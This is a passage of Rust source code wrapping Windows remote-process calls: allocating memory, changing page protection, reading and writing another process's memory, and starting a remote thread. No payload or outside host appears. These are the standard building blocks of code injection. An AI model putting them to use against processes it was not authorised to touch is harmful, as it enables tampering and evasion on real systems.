            Err(Error::Win32("VirtualAllocEx", unsafe { GetLastError() }))
        } else {
            Ok(addr)
        }
    }

    fn virtual_protect_ex(
        &self,
        addr: *mut c_void,
        size: usize,
        new_protection: u32,
    ) -> Result<()> {
        let mut old_protection = 0;
        let success = unsafe {
            VirtualProtectEx(
                self.handle.0,
                addr,
                size,
                new_protection,
                &mut old_protection,
            )
        };
        if success == 0 {
            Err(Error::Win32("VirtualProtectEx", unsafe { GetLastError() }))
        } else {
            Ok(())
        }
    }

    fn write_process_memory<T: Copy>(&self, addr: *mut c_void, data: &[T]) -> Result<()> {
        let size_bytes = size_of_val(data);
        let mut write_len: usize = 0;
        let success = unsafe {
            WriteProcessMemory(
                self.handle.0,
                addr,
                data.as_ptr().cast(),
                size_bytes,
                &mut write_len,
            )
        };
        if success == 0 || write_len != size_bytes {
            Err(Error::Win32("WriteProcessMemory", unsafe {
                GetLastError()
            }))
        } else {
            Ok(())
        }
    }

    fn read_process_memory(&self, addr: *mut c_void, buffer: &mut [u8]) -> Result<()> {
        let mut read = 0;
        let res = unsafe {
            ReadProcessMemory(
                self.handle.0,
                addr,
                buffer.as_mut_ptr() as *mut c_void,
                buffer.len(),
                &mut read,
            )
        };
        if res == 0 {
            Err(Error::Win32("ReadProcessMemory (Buf)", unsafe {
                GetLastError()
            }))
        } else {
            Ok(())
        }
    }

    fn create_remote_thread(
        &self,
        routine_ptr: LPTHREAD_START_ROUTINE,
        parameter: *const c_void,
    ) -> Result<HandleGuard> {
        let handle = unsafe {
            CreateRemoteThread(
                self.handle.0,
                null(),
                0,
                routine_ptr,
                parameter,
                0,
                null_mut(),
            )
        };
        if handle.is_null() {
            Err(Error::Win32("CreateRemoteThread", unsafe {
                GetLastError()
            }))
        } else {
            Ok(HandleGuard::new(handle))
        }
    }
}
